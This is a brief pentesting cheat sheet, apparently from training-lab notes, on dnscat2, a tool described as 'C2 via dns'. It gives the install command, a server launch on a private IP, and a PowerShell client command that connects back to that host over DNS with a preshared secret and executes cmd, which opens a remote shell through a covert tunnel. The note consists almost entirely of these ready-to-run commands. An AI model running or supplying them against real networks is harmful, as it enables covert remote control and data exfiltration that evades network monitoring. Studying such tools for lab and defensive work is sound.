>Is a tunneling tool that uses DNS protocol to create encrypted communication channel between two hosts. In other words, C2 via dns

# Setup

```sh
sudo apt install dnscat2-server
```

# Run dns server

```sh
dnscat2-server --dns port=53,host=10.10.15.207,domain=wah.com --
```

```powershell-session
Start-Dnscat2 -DNSserver 10.10.15.207 -DNSPort 53 -Domain inlanefreight.local -PreSharedSecret be1eb0d437006daba66326ac28abbfef -Exec cmd
```